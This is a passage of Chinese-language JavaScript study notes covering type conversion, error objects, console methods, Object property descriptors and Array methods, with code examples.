如果toString方法返回的是对象，再调用原对象的valueOf方法。如果valueOf方法返回原始类型的值，则对该值使用String函数，不再进行以下步骤。// 如果valueOf方法返回的是对象，就报错。// String方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式。String(&#123;a: 1&#125;) // "[object Object]"String([1, 2, 3]) // "1,2,3"// valueOf和toString方法，都是可以自定义的。toString方法先于valueOf方法执行 Boolean() 将任意类型的值转为布尔值 123456789101112// 它的转换规则相对简单：除了 "", 0, NaN, null, undefined, false 几个值的转换结果为false，其他的值全部为true。Boolean(undefined) // falseBoolean(null) // falseBoolean(0) // falseBoolean(NaN) // falseBoolean('') // false// 所有对象（包括空对象）的布尔值都是true，甚至连false对应的布尔对象new Boolean(false)也是trueBoolean(&#123;&#125;) // trueBoolean([]) // trueBoolean(new Boolean(false)) // true// 因为 JavaScript 语言设计的时候，出于性能的考虑，如果对象需要计算才能得到布尔值，对于obj1 &amp;&amp; obj2这样的场景，可能会需要较多的计算。为了保证性能，就统一规定，对象的布尔值为true。 自动转换自动转换是以强制转换为基础的。遇到以下三种情况时，JavaScript 会自动转换数据类型，即转换是自动完成的，用户不可见。123456789101112131415161718192021222324252627282930313233343536373839404142434445// 第一种情况，不同类型的数据互相运算。123 + 'abc' // "123abc"// 第二种情况，对非布尔值类型的数据求布尔值。if ('abc') &#123;console.log('true');&#125; // true// 第三种情况，对非数值类型的值使用一元运算符（即+和-）。+ &#123;foo: 'bar'&#125; // NaN- [1, 2, 3] // NaN// 自动转换的规则是这样的：预期什么类型的值，就调用该类型的转换函数。比如，某个位置预期为字符串，就调用String函数进行转换。如果该位置即可以是字符串，也可能是数值，那么默认转为数值。 由于自动转换具有不确定性，而且不易除错，建议在预期为布尔值、数值、字符串的地方，全部使用Boolean、Number和String函数进行显式转换。// 自动转换为布尔值// JavaScript 遇到预期为布尔值的地方（比如if语句的条件部分），就会将非布尔值的参数自动转换为布尔值。系统内部会自动调用Boolean函数。// 除了 "", 0, NaN, null, undefined, false 几个值，其他都是自动转为true。if ('abc') &#123;console.log('true');&#125; // trueexpression ? true : false!! expression// 自动转换为字符串// JavaScript 遇到预期为字符串的地方，就会将非字符串的值自动转为字符串。具体规则是，先将复合类型的值转为原始类型的值，再将原始类型的值转为字符串。// 字符串的自动转换，主要发生在字符串的加法运算时。当一个值为字符串，另一个值为非字符串，则后者转为字符串。'5' + 1 // '51''5' + true // "5true"'5' + &#123;&#125; // "5[object Object]"'5' + [] // "5"'5' + function ()&#123;&#125; // "5function ()&#123;&#125;"'5' + undefined // "5undefined"'5' + null // "5null"// 自动转换为数值// JavaScript 遇到预期为数值的地方，就会将参数值自动转换为数值。系统内部会自动调用Number函数。// 除了加法运算符（+）有可能把运算子转为字符串，其他运算符都会把运算子自动转成数值。'5' - '2' // 3true - 1 // 0'5' * [] // 0false / '5' // 0'abc' - 1 // NaN// null转为数值时为0，而undefined转为数值时为NaNnull + 1 // 1undefined + 1 // NaN// 一元运算符也会把运算子转成数值。+'abc' // NaN-'abc' // NaN+true // 1-false // 0 错误处理机制Error 实例对象JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供Error构造函数，所有抛出的错误都是这个构造函数的实例。123456789101112131415161718192021222324var err = new Error('出错了');err.message // "出错了"// message：错误提示信息。 必须有message属性// name：错误名称（非标准属性）// stack：错误的堆栈（非标准属性）function throwit() &#123; throw new Error('');&#125;function catchit() &#123; try &#123; throwit(); &#125; catch(e) &#123; console.log(e.stack); // print stack trace // Error // at throwit (~/examples/throwcatch.js:9:11) // at catchit (~/examples/throwcatch.js:3:9) // at repl:1:5 // 上面代码中，错误堆栈的最内层是throwit函数，然后是catchit函数，最后是函数的运行环境 &#125;&#125;catchit() 原生错误类型Error实例对象是最一般的错误类型，在它的基础上，JavaScript 还定义了其他6种错误对象。也就是说，存在Error的6个派生对象。 SyntaxError 对象解析代码时发生的语法错误。当Javascript语言解析代码时,Javascript引擎发现了不符合语法规范的token或token顺序时抛出SyntaxError.new SyntaxError([message[, fileName[, lineNumber]]]) ReferenceError 对象引用一个不存在的变量时发生的错误，或者将一个值分配给无法分配的对象，比如对函数的运行结果或者this赋值 RangeError 对象一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是Number对象的方法参数超出范围，以及函数堆栈超过最大值。 TypeError 对象TypeError对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用new命令，就会抛出这种错误，因为new命令的参数应该是一个构造函数。 调用对象不存在的方法，也会抛出TypeError错误，因为obj.unknownMethod的值是undefined，而不是一个函数。 URIError 对象URI 相关函数的参数不正确时抛出的错误，主要涉及encodeURI()、decodeURI()、encodeURIComponent()、decodeURIComponent()、escape()和unescape()这六个函数。 EvalError 对象eval函数没有被正确执行时，会抛出EvalError错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留。 自定义错误除了 JavaScript 原生提供的七种错误对象，还可以定义自己的错误对象。 123456789function UserError(message) &#123; this.message = message || '默认信息'; this.name = 'UserError';&#125;UserError.prototype = new Error();UserError.prototype.constructor = UserError;// 上面代码自定义一个错误对象UserError，让它继承Error对象。然后，就可以生成这种自定义类型的错误了。new UserError('这是自定义的错误！'); throw 语句手动中断程序执行，抛出一个错误。throw可以抛出任何类型的值。也就是说，它的参数可以是任何值。遇到throw语句，程序就中止了。引擎会接收到throw抛出的信息，可能是一个错误实例，也可能是其他类型的值。 try…catch…finally一旦发生错误，程序就中止执行了。JavaScript 提供了try…catch结构，允许对错误进行处理，选择是否往下执行。 12345678910111213try &#123; throw new Error('出错了');&#125; catch(e) &#123; // catch接受一个参数，表示try代码块抛出的值 // 捕获错误，处理错误。 catch代码块捕获错误之后，程序不会中断，会按照正常流程继续执行下去 if (e instanceof SyntaxError) &#123; console.log(e.message) &#125; else if (e instanceof RangeError) &#123; console.log(e.message) &#125;&#125; finally &#123; // 允许在最后添加一个finally代码块，表示不管是否出现错误，都必需在最后运行的语句 console.log('完成了');&#125; 编程风格“编程风格”（programming style）指的是编写代码的样式规则，要考虑如何尽量使代码清晰易读、减少出错，风格一致。主要涉及缩进、区块、圆括号、行尾的分号、全局变量、变量声明、相等和严格相等、语句的合并、自增和自减运算符等。 switch…case 结构建议switch…case结构可以用对象结构代替。switch…case结构要求，在每一个case的最后一行必须是break语句，否则会接着运行下一个case。这样不仅容易忘记，还会造成代码的冗长。而且，switch…case不使用大括号，不利于代码形式的统一。此外，这种结构类似于goto语句，容易造成程序流程的混乱，使得代码结构混乱不堪，不符合面向对象编程的原则。123456789101112131415161718192021222324252627282930313233function doAction(action) &#123; switch (action) &#123; case 'hack': return 'hack'; case 'slash': return 'slash'; case 'run': return 'run'; default: throw new Error('Invalid action.'); &#125;&#125;// 建议改写成对象结构function doAction(action) &#123; var actions = &#123; 'hack': function () &#123; return 'hack'; &#125;, 'slash': function () &#123; return 'slash'; &#125;, 'run': function () &#123; return 'run'; &#125; &#125;; if (typeof actions[action] !== 'function') &#123; throw new Error('Invalid action.'); &#125; return actions[action]();&#125; console 对象与控制台console对象是 JavaScript 的原生对象，类似 Unix 系统的标准输出stdout和标准错误stderr，可以输出各种信息到控制台，并且还提供了很多有用的辅助方法。打开控制台: 按 F12 或者Control + Shift + i（PC）/ Command + Option + i（Mac）。 console 对象的静态方法 console.log()console.log方法用于在控制台输出信息。 123456789101112131415161718192021222324252627282930// 如果第一个参数是格式字符串（使用了格式占位符），console.log方法将依次用后面的参数替换占位符，然后再进行输出。console.log(' %s + %s = %s', 1, 1, 2) // 1 + 1 = 2// 它可以接受一个或多个参数，将它们连接起来输出。会自动在每次输出的结尾，添加换行符。console.log('Hello World') // Hello Worldconsole.log('a', 'b', 'c') // a b c// 如果第一个参数是格式字符串（使用了格式占位符），console.log方法将依次用后面的参数替换占位符，然后再进行输出。console.log(' %s + %s = %s', 1, 1, 2) // 1 + 1 = 2// 支持以下占位符: %s 字符串、%d 整数、%i 整数、%f 浮点数、%o 对象的链接、%c CSS 格式字符串。不同类型的数据必须使用对应的占位符var number = 11 * 9;var color = 'red';console.log('%d %s balloons', number, color); // 99 red balloons// 使用%c占位符时，对应的参数必须是 CSS 代码，用来对输出内容进行 CSS 渲染。console.log('%cThis text is styled!', 'color: red; background: yellow; font-size: 24px;') // 输出的内容将显示为黄底红字// 如果参数是一个对象，console.log会显示该对象的值。console.log(&#123;foo: 'bar'&#125;) // &#123;foo: "bar"&#125;console.log(Date) // function Date() &#123; [native code] &#125; 输出Date对象的值，结果为一个构造函数// console对象的所有方法，都可以被覆盖。因此，可以按照自己的需要，定义console.log方法。['log', 'info', 'warn', 'error'].forEach(function(method) &#123; console[method] = console[method].bind( console, new Date().toISOString() );&#125;);console.log("出错了！"); // 2019-03-02T11:01:37.745Z 出错了！ console.table()对于某些复合类型的数据，console.table方法可以将其转为表格显示。 1234567var languages = [ &#123; name: "JavaScript", fileExtension: ".js" &#125;, &#123; name: "TypeScript", fileExtension: ".ts" &#125;, &#123; name: "CoffeeScript", fileExtension: ".coffee" &#125;];console.table(languages); console.count()count方法用于计数，输出它被调用了多少次。 12345678910111213141516function greet(user) &#123; console.count(); return 'hi ' + user;&#125;// 每次调用greet函数，内部的console.count方法就输出执行次数。greet('bob') // default: 1 // "hi bob"greet('alice') // default: 2 // "hi alice"// 该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类。function greet(user) &#123; console.count(user); return "hi " + user;&#125;greet('bob') // bob: 1 // "hi bob"greet('bob') // bob: 2 // "hi bob" console.dir()、console.dirxml()dir方法用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。 12345678910111213141516console.log(&#123;f1: 'foo', f2: 'bar'&#125;) // &#123;f1: "foo", f2: "bar"&#125;console.dir(&#123;f1: 'foo', f2: 'bar'&#125;) // Object f1: "foo" f2: "bar"__proto__: Object// 该方法对于输出 DOM 对象非常有用，因为会显示 DOM 对象的所有属性。console.dir(document.body)// Node 环境之中，还可以指定以代码高亮的形式输出。console.dir(obj, &#123;colors: true&#125;)// dirxml方法主要用于以目录树的形式，显示 DOM 节点。console.dirxml(document.body)// 如果参数不是 DOM 节点，而是普通的 JavaScript 对象，console.dirxml等同于console.dir。console.dirxml([1, 2, 3])// 等同于console.dir([1, 2, 3]) console.assert()主要用于程序运行过程中，进行条件判断，如果不满足条件，就显示一个错误，但不会中断程序执行。这样就相当于提示用户，内部状态不正确。它接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为false，才会提示有错误，在控制台输出第二个参数，否则不会有任何结果。 12345678910111213console.assert(false, '判断条件不成立') // Assertion failed: 判断条件不成立// 相当于try &#123; if (!false) &#123; throw new Error('判断条件不成立'); &#125;&#125; catch(e) &#123; console.error(e);&#125;// 如，判断子节点的个数是否大于等于500。如果符合条件的节点小于500个，不会有任何输出；只有大于等于500时，才会在控制台提示错误，并且显示指定文本。console.assert(list.childNodes.length &lt; 500, '节点个数大于等于500') console.time()，console.timeEnd()用于计时，可以算出一个操作所花费的准确时间。time方法表示计时开始，timeEnd方法表示计时结束。它们的参数是计时器的名称。调用timeEnd方法之后，控制台会显示“计时器名称: 所耗费的时间”。 12345678console.time('Array initialize');var array= new Array(1000000);for (var i = array.length - 1; i &gt;= 0; i--) &#123; array[i] = new Object();&#125;;console.timeEnd('Array initialize'); // Array initialize: 339.818115234375ms console.group()，console.groupEnd()，console.groupCollapsed()console.group和console.groupEnd这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠/展开。 123456789// 下面代码会将“二级分组”显示在“一级分组”内部，并且“一级分组”和“二级分组”前面都有一个折叠符号，可以用来折叠本级的内容。console.group('一级分组');console.log('一级分组的内容');console.group('二级分组');console.log('二级分组的内容');console.groupEnd(); // 二级分组结束console.groupEnd(); // 一级分组结束 console.groupCollapsed方法与console.group方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。 console.trace()显示当前执行的代码在堆栈中的调用路径 123456console.trace()// Trace// at repl:1:9// at ContextifyScript.Script.runInThisContext (vm.js:50:33)// ... console.clear()用于清除当前控制台的所有输出，将光标回置到第一行。如果用户选中了控制台的“Preserve log”选项，console.clear方法将不起作用。 控制台命令行 API $_ 返回上一个表达式的值 $0 - $4 控制台保存了最近5个在 Elements 面板选中的 DOM 元素，$0代表倒数第一个（最近一个），$1代表倒数第二个，以此类推直到$4。 $(selector) 返回第一个匹配的元素，等同于document.querySelector() $$(selector) 返回选中的 DOM 对象，等同于document.querySelectorAll inspect(window) 打开相关面板，并选中相应的元素，显示它的细节。 比如inspect(document)会在 Elements 面板显示document元素 getEventListeners(object) 返回一个对象，该对象的成员为object登记了回调函数的各种事件（比如click或keydown），每个事件对应一个数组，数组的成员为该事件的回调函数 keys(object) 返回一个数组，包含object的所有键名 values(object) 返回一个数组，包含object的所有键值 （9）monitorEvents(object[, events]) 监听特定对象上发生的特定事件。事件发生时，会返回一个Event对象，包含该事件的相关信息 unmonitorEvents(object[, events]) 用于停止监听 如monitorEvents(window, [“resize”, “scroll”]) 123456789101112131415// 下面代码分别表示单个事件和多个事件的监听方法。monitorEvents(window, ["resize", "scroll"])monitorEvents(window, "resize");// 下面代码表示如何停止监听monitorEvents($0, 'mouse');unmonitorEvents($0, 'mousemove');// monitorEvents允许监听同一大类的事件。所有事件可以分成四个大类。mouse："mousedown", "mouseup", "click", "dblclick", "mousemove", "mouseover", "mouseout", "mousewheel"key："keydown", "keyup", "keypress", "textInput"touch："touchstart", "touchmove", "touchend", "touchcancel"control："resize", "scroll", "zoom", "focus", "blur", "select", "change", "submit", "reset"// 监听所有key大类的事件monitorEvents($("#msg"), "key"); clear()：清除控制台的历史 copy(object)：复制特定 DOM 元素到剪贴板 dir(object)：显示特定对象的所有属性，是console.dir方法的别名 debugger 语句debugger语句主要用于除错，作用是设置断点。如果有正在运行的除错工具，程序运行到debugger语句时会自动停下。如果没有除错工具，debugger语句不会产生任何结果，JavaScript 引擎自动跳过这一句。 Chrome 浏览器中，当代码运行到debugger语句时，就会暂停运行，自动打开脚本源码界面。 标准库Object 对象JavaScript 原生提供Object对象,JavaScript 的所有其他对象都继承自Object对象，即那些对象都是Object的实例。 Object对象的原生方法分成两类：Object本身的方法与Object的实例方法。 1234567891011// Object对象本身的方法,即直接定义在Object对象的方法。Object.print = function (o) &#123; console.log(o) &#125;;// Object的实例方法，即定义在Object原型对象Object.prototype上的方法。它可以被Object实例直接使用// 凡是定义在Object.prototype对象上面的属性和方法，将被所有实例对象共享Object.prototype.print = function () &#123; console.log(this);&#125;;var obj = new Object();obj.print() // &#123;&#125; Object() 工具方法Object本身是一个函数，可以当作工具方法使用，将任意值转为对象。这个方法常用于保证某个值一定是对象。123456789101112131415161718192021222324// 如果参数为空（或者为undefined和null），Object()返回一个空对象。var obj = Object();// 等同于var obj = Object(undefined); // 将undefined和null转为对象，结果得到了一个空对象objvar obj = Object(null);obj instanceof Object // true// 如果参数是原始类型的值，Object方法将其转为对应的包装对象的实例(原始类型值对应的包装对象)var obj = Object(1);obj instanceof Object // trueobj instanceof Number // true// 如果Object方法的参数是一个对象，它总是返回该对象，即不用转换。var arr = [];var obj = Object(arr); // 返回原数组obj === arr // true// 利用这一点，可以写一个判断变量是否为对象的函数。function isObject(value) &#123; return value === Object(value);&#125;isObject([]) // trueisObject(true) // false new Object() 构造函数Object不仅可以当作工具函数使用，还可以当作构造函数使用，即前面可以使用new命令。1234567891011// Object构造函数的首要用途，是直接通过它来生成新对象。var obj = new Object();// 等同于var obj = &#123;&#125;// 可以接受一个参数，如果该参数是一个对象，则直接返回这个对象；如果是一个原始类型的值，则返回该值对应的包装对象var o1 = &#123;a: 1&#125;; var o2 = new Object(o1);o1 === o2 // true// Object构造函数的用法与工具方法虽然用法相似,但语义不同，Object(value)表示将value转成一个对象，new Object(value)则表示新生成一个对象，它的值是value Object 的静态方法 Object.keys()，Object.getOwnPropertyNames()由于 JavaScript 没有提供计算对象属性个数的方法，所以可以用这两个方法代替。如Object.keys(obj).lengthObject.keys方法的参数是一个对象，返回一个数组。该数组的成员都是该对象自身的（而不是继承的）可枚举的属性名。Object.getOwnPropertyNames方法与Object.keys类似，也是接受一个对象作为参数，返回一个数组，包含了该对象自身的所有(含不可枚举)属性名。 对象属性模型的相关方法Object.getOwnPropertyDescriptor()：获取某个属性的描述对象。Object.defineProperty()：通过描述对象，定义某个属性。Object.defineProperties()：通过描述对象，定义多个属性。 控制对象状态的方法Object.preventExtensions()：防止对象扩展。Object.isExtensible()：判断对象是否可扩展。Object.seal()：禁止对象配置。Object.isSealed()：判断一个对象是否可配置。Object.freeze()：冻结一个对象。Object.isFrozen()：判断一个对象是否被冻结 原型链相关方法Object.create()：该方法可以指定原型对象和属性，返回一个新的对象。Object.getPrototypeOf()：获取对象的Prototype对象。 Object 的实例方法除了静态方法，还有不少方法定义在Object.prototype对象。它们称为实例方法，所有Object的实例对象都继承了这些方法。 Object.prototype.valueOf()：返回当前对象对应的值。默认情况下返回对象本身。自动类型转换时会默认调用这个方法 12var obj = new Object();1 + obj // "1[object Object]" 默认调用valueOf()方法，求出obj的值再与1相加。可自定义valueOf方法 Object.prototype.toString()：返回当前对象对应的字符串形式。默认情况下返回类型字符串。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 对于一个对象调用toString方法，会返回字符串[object Object]，该字符串说明对象的类型var o1 = new Object();o1.toString() // "[object Object]"var o2 = &#123;a:1&#125;;o2.toString() // "[object Object]"// 数组、字符串、函数、Date 对象都分别部署了自定义的toString方法，覆盖了Object.prototype.toString原始方法。[1, 2, 3].toString() // "1,2,3"'123'.toString() // "123"(function () &#123; return 123;&#125;).toString()// "function () &#123;// return 123;// &#125;"(new Date()).toString() // "Sun Mar 03 2019 13:11:11 GMT+0800 (China Standard Time)"// Object.prototype.toString方法返回对象的类型字符串，是一个十分有用的判断数据类型的方法。 不使用可能被覆盖的obj.toString()自定义方法。Object.prototype.toString.call(value)// 不同数据类型的Object.prototype.toString方法返回值如下。数值：返回[object Number]。字符串：返回[object String]。布尔值：返回[object Boolean]。undefined：返回[object Undefined]。null：返回[object Null]。数组：返回[object Array]。arguments 对象：返回[object Arguments]。函数：返回[object Function]。Error 对象：返回[object Error]。Math 对象：返回[object Math]。Date 对象：返回[object Date]。RegExp 对象：返回[object RegExp]。其他对象：返回[object Object]。// 利用这个特性，可以写出一个比typeof运算符更准确的类型判断函数。var type = function (o)&#123; var s = Object.prototype.toString.call(o); return s.match(/\[object (.*?)\]/)[1].toLowerCase();&#125;;type(&#123;&#125;); // "object"// 在上面这个type函数的基础上，还可以加上专门判断某种类型数据的方法。['Null', 'Undefined', 'Object', 'Array', 'String', 'Number', 'Boolean', 'Function', 'RegExp'].forEach(function (t) &#123; type['is' + t] = function (o) &#123; return type(o) === t.toLowerCase(); &#125;;&#125;);type.isRegExp(/abc/) // true Object.prototype.toLocaleString()：返回当前对象对应的本地字符串形式。 Object.prototype.hasOwnProperty()：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。 Object.prototype.isPrototypeOf()：判断当前对象是否为另一个对象的原型。 Object.prototype.propertyIsEnumerable()：判断某个属性是否可枚举。 属性描述对象JavaScript 提供了一个内部数据结构，用来描述对象的属性，控制它的行为，比如该属性是否可写、可遍历等等。这个内部数据结构称为“属性描述对象”（attributes object）。每个属性都有自己对应的属性描述对象，保存该属性的一些元信息。1234567891011121314151617181920212223242526272829303132333435363738394041// 属性描述对象提供6个元属性&#123; value: undefined, // 目标属性的值，默认为 undefined writable: true, // 是否可写，默认为 true enumerable: true, // 是否可枚举，默认为true // 有四个操作会忽略enumerable为false的属性 // for...in循环：只遍历对象自身的和继承的可枚举的属性。 // Object.keys()：返回对象自身的所有可枚举的属性的键名。 // JSON.stringify()：只串行化对象自身的可枚举的属性。 // Object.assign()： 忽略enumerable为false的属性，只拷贝对象自身的可枚举的属性 configurable: true, // 是否可配置性，默认为true // 若为false，将阻止某些操作改写该属性，比如无法删除，也不得改变该属性的属性描述对象（value除外）,即configurable属性控制了属性描述对象的可写性 get: undefined, // 该属性的取值函数（getter），默认为undefined set: undefined // 该属性的存值函数（setter），默认为undefined&#125;// JavaScript 还提供了存取器的另一种写法。这种写法与上面定义属性描述对象是等价的，而且使用更广泛。var obj = &#123; get p() &#123; return 'getter'; &#125;, set p(value) &#123; console.log('setter: ' + value); &#125;&#125;;// 存取器往往用于，属性的值依赖对象内部数据的场合。var obj =&#123; $n : 5, get next() &#123; return this.$n++ &#125;, set next(n) &#123; if (n &gt;= this.$n) this.$n = n; else throw new Error('新的值必须大于当前值'); &#125;&#125;;obj.next // 5 next属性的存值函数和取值函数，都依赖于内部属性$n。obj.next = 10;obj.next // 10obj.next = 5; // Uncaught Error: 新的值必须大于当前值 Object.getOwnPropertyDescriptor()可以获取自身属性描述对象，不能用于继承的属性。它的第一个参数是目标对象，第二个参数是一个字符串，对应目标对象的某个属性名。 12var obj = &#123; p: 'a' &#125;;Object.getOwnPropertyDescriptor(obj, 'p') // &#123; value: "a", writable: true, enumerable: true, configurable: true &#125; Object.getOwnPropertyNames()返回一个数组，成员是参数对象自身的全部属性的属性名，不管该属性是否可遍历。 123Object.getOwnPropertyNames([]) // [ 'length' ]Object.getOwnPropertyNames(Object.prototype) // ["constructor", "__defineGetter__", "__defineSetter__", "hasOwnProperty", "__lookupGetter__", "__lookupSetter__", "isPrototypeOf", "propertyIsEnumerable", "toString", "valueOf", "__proto__", "toLocaleString"] Object.defineProperty(object, propertyName, attributesObject)允许通过属性描述对象，定义或修改一个属性，然后返回修改后的对象 12345678910111213141516// value默认为undefined，writable、configurable、enumerable默认为falsevar obj = Object.defineProperty(&#123;&#125;, 'p', &#123; value: undefined, writable: false, enumerable: false, configurable: false&#125;);// 如果一次性定义或修改多个属性，可以使用Object.defineProperties()方法。var obj2 = Object.defineProperties(&#123;&#125;, &#123; p1: &#123; value: 123, enumerable: true &#125;, p2: &#123; value: 'abc', enumerable: true &#125;, p3: &#123; get: function () &#123; return this.p1 + this.p2 &#125;, enumerable:true, configurable:true &#125;&#125;);// 注意，如果一个描述符同时有(get或set) 和 (value或writable)关键字，将会产生一个异常 Object.prototype.propertyIsEnumerable()返回一个布尔值，用来判断某个属性是否可遍历。注意，这个方法只能用于判断对象自身的属性，对于继承的属性一律返回false。如obj.propertyIsEnumerable(‘toString’) // false 对象的拷贝有时，我们需要将一个对象的所有属性，拷贝到另一个对象，可以用下面的方法实现。 123456789var extend = function (to, from) &#123; for (var property in from) &#123; if (!from.hasOwnProperty(property)) continue; Object.defineProperty(to, property, Object.getOwnPropertyDescriptor(from, property)); &#125; return to;&#125;extend(&#123;&#125;, &#123; get a()&#123; return 1 &#125; &#125;) // &#123; get a()&#123; return 1 &#125; &#125;) 控制对象状态有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，最弱的一种是Object.preventExtensions，其次是Object.seal，最强的是Object.freeze。 Object.preventExtensions() 无法再添加新的属性。 用 Object.isExtensible()检测Object.seal() 禁止新增或删除旧属性，并不影响修改某个属性的值。实质是把属性描述对象的configurable属性设为false。 用 Object.isSealed()检测Object.freeze() 无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量。 用 Object.isFrozen()检测 12345678910111213141516171819// 上面的三个方法锁定对象的可写性有一个漏洞：可以通过改变原型对象，来为对象增加属性。一种解决方案是，把obj的原型也冻结住。var obj = new Object();Object.preventExtensions(obj);var proto = Object.getPrototypeOf(obj);Object.preventExtensions(proto);proto.t = 'hello';obj.t // undefined// 另外一个局限是，如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容。var obj = &#123; foo: 1, bar: ['a', 'b']&#125;;Object.freeze(obj);obj.bar.push('c');obj.bar // ["a", "b", "c"] obj.bar属性指向一个数组，obj对象被冻结以后，这个指向无法改变，即无法指向其他值，但是所指向的数组是可以改变的。 Array 对象Array是 JavaScript 的原生对象，同时也是一个构造函数，可以用它生成新的数组。 构造函数 new Array()1234567891011121314151617181920212223242526var arr = new Array(2); // [ empty x 2 ] 生成一个两个成员的数组，每个位置都是空值// 如果没有使用new，运行结果也是一样的。等同于var arr = Array(2);// Array构造函数有一个很大的缺陷，就是不同的参数，会导致它的行为不一致。// 无参数时，返回一个空数组new Array() // []// 单个正整数参数，表示返回的新数组的长度new Array(2) // [ empty x 2 ]// 非正整数的数值作为参数，会报错new Array(3.2) // RangeError: Invalid array lengthnew Array(-3) // RangeError: Invalid array length// 单个非数值（比如字符串、布尔值、对象等）作为参数，则该参数是返回的新数组的成员new Array('abc') // ['abc']new Array([1]) // [Array[1]]// 多参数时，所有参数都是返回的新数组的成员new Array(1, 2) // [1, 2]new Array('a', 'b', 'c') // ['a', 'b', 'c']// 因此，不建议使用它生成新数组，直接使用数组字面量是更好的做法var arr = new Array(1, 2); // badvar arr = [1, 2]; // good// 如果参数是一个正整数，返回数组的成员都是空位。虽然读取的时候返回undefined，但实际上该位置没有任何值。虽然可以取到length属性，但是取不到键名。var a = new Array(2); // [empty × 2]var b = [undefined, undefined]; // [undefined, undefined] 静态方法Array.isArray() 方法返回一个布尔值，表示参数是否为数组。它可以弥补 typeof 运算符的不足。1234// typeof 运算符只能显示数组的类型是Object，而Array.isArray() 方法可以识别数组。var arr = [1, 2, 3];typeof arr // "object"Array.isArray(arr) // true 实例方法 valueOf() 方法是一个所有对象都拥有的方法，表示对该对象求值。不同对象的valueOf方法不尽一致，数组的valueOf方法返回数组本身。 toString() 方法也是对象的通用方法，数组的toString方法返回数组的字符串形式。 123456789var arr = [1, 2, 3];arr.valueOf() // [1, 2, 3]var arr = [1, 2, 3];arr.toString() // "1,2,3"var arr = [1, 2, 3, [4, 5, 6]];arr.toString() // "1,2,3,4,5,6" push() 方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。 pop() 方法用于删除数组的最后一个元素，并返回该元素。注意，该方法会改变原数组。 123456789// push和pop结合使用，就构成了 LIFO（Last-In-First-Out，后进先出）的栈结构（stack）。最新添加的项最早被移除。比如，箱子里的书，后放入的先取出。arr.push('d') // 4arr // ["a", "b", "c", "d"]arr.pop() // 'd' arr // ["a", "b", "c"] 'd'是最后进入数组的，但是最早离开数组// 对空数组使用pop方法，不会报错，而是返回undefined。[].pop() // undefined shift()方法用于删除数组的第一个元素，并返回该元素。注意，该方法会改变原数组。 unshift()方法用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。 123456789101112var arr = ['a', 'b', 'c'];arr.shift() // 'a'arr // ['b', 'c']arr.unshift('x'); // 3arr // ["x", "b", "c"]// unshift()方法可以接受多个参数，这些参数都会添加到目标数组头部。arr.unshift('1', '2') // 5arr // ["1", "2", "x", "b", "c"]// push和shift结合使用，就构成了 FIFO(Fist-In-First-Out,先进先出) 队列结构（queue）。即在数组的后端添加项，从数组的前端移除项。比如，火车站排队买票，先到的先买，买好的先走。 join()方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔。 12345678910111213var a = [1, 2, 3, 4];a.join() // "1,2,3,4"a.join(' ') // '1 2 3 4'a.join(' | ') // "1 | 2 | 3 | 4"// 如果数组成员是undefined或null或空位，会被转成空字符串。[undefined, , null].join('#') // '##'// 通过call方法，这个方法也可以用于字符串或类似数组的对象。var obj = &#123; 0: 'a', 1: 'b', length: 2 &#125;;Array.prototype.join.call(obj, '-') // "a-b"Array.prototype.join.call('hello', '-') // "h-e-l-l-o" concat() 方法用于多个数组的合并。它将新数组的成员，添加到原数组成员的后部，然后返回一个新数组，原数组不变。 123456789101112['hello'].concat(['world'], ['!']) // ["hello", "world", "!"][].concat(&#123;a: 1&#125;, &#123;b: 2&#125;) // [&#123; a: 1 &#125;, &#123; b: 2 &#125;]// 除了数组作为参数，concat也接受其他类型的值作为参数，添加到目标数组尾部。[1, 2, 3].concat(4, 5, 6) // [1, 2, 3, 4, 5, 6]// 如果数组成员包括对象，concat方法返回当前数组的一个浅拷贝。所谓“浅拷贝”，指的是新数组拷贝的是对象的引用，改变原对象以后，新数组跟着改变。var obj = &#123; a: 1 &#125;;var oldArray = [obj];var newArray = oldArray.concat();obj.a = 2;newArray[0].a // 2 reverse() 方法用于颠倒排列数组元素，返回改变后的数组。注意，该方法将改变原数组。 slice() 方法用于提取目标数组的一部分，返回一个新数组，它是一个由 start和 end（不包括end）决定的原数组的浅拷贝。原始数组不会被改变。 1234567891011// 它的第一个参数为起始位置（从0开始），第二个参数为终止位置（不含）。如果省略第二个参数，则一直返回到原数组的最后一个成员。arr.slice(start,end)// 如果slice没有参数，实际上等于返回一个原数组的拷贝。// 如果slice方法的参数是负数，则表示倒数计算的位置。// 如果第一个参数大于等于数组长度，或者第二个参数小于第一个参数，则返回空数组。// slice方法的一个重要应用，是将类似数组的对象转为真正的数组。Array.prototype.slice.call(&#123; 0: 'a', 1: 'b', length: 2 &#125;) // ['a', 'b']Array.prototype.slice.call(document.querySelectorAll("div"));Array.prototype.slice.call(arguments); splice方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组。 12345678910111213141516171819arr.splice(index,howmany,item1,.....,itemX)// index 必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。// howmany 必需。要删除的项目数量。如果设置为 0，则不会删除项目。// item1, ..., itemX 可选。向数组添加的新项目。// 下面代码从原数组2号位置，删除了两个数组成员，还插入了两个新成员。var a = ['a', 'b', 'c', 'd'];a.splice(2, 2, 1, 2) // ["c", "d"]a // ["a", "b", 1, 2]// 如果只是单纯地插入元素，splice方法的第二个参数可以设为0。var b = [1, 1, 